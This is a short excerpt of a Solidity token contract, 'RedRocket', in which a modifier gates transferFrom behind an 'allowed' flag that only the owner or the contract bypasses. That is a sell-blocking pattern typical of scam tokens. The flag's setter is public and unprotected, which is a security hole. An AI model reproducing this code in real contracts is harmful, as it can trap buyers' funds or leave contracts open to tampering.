...
contract RedRocket is Context, IERC20, Ownable {
    ...
    modifier aftersale(){
        require(allowed ==true|| msg.sender == address(this) || msg.sender == _owner);
        _;
    }
    
    function setAllowed(bool _allowed) public returns(bool){
        allowed = _allowed;
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public aftersale override returns (bool) {
